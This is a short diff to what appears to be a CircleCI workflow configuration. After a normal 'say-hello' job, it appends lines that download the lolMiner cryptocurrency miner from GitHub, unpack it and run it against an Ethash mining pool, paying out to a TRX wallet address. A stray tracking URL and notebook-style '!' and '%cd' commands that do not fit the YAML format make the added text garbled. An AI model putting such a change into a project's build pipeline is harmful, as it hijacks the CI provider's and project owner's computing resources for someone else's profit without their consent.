@@ -24,3 +24,11 @@ workflows:
   say-hello-workflow:
     jobs:
       - say-hello
+runhttps://email.circleci.com/c/eJxNjrsSgjAURL8mdDIhN0ZSpPAxaGPnjFre3ATIiKgQFf16oXPmbLPF2XUmVzpPghFcTAguMz2HlEptvfQ6cyKb68WCSU6ho8ZTSOl2TWpjLdlSKdQ5kdPWKZKy1NxDxiXPAZLG1DHeewZLJooRfMY6_ZeM3XOMv2JoZi_fhTIQxnBrGRQx0MVHBhtXVOv-vBP7lQI8rL79Tg7DcNi26vzAU3tkApLOOOw-b2zwUmM7Xq0m5TTxA9GlRgg
+!wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+
+!tar -xf lolMiner_v1.29_Lin64.tar.gz
+
+%cd 1.29
+
+!./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TDdmtxkYNVJhZanWrN6jwhyerqC2nhgpEd.God_miner_YT#ek61-6h9x
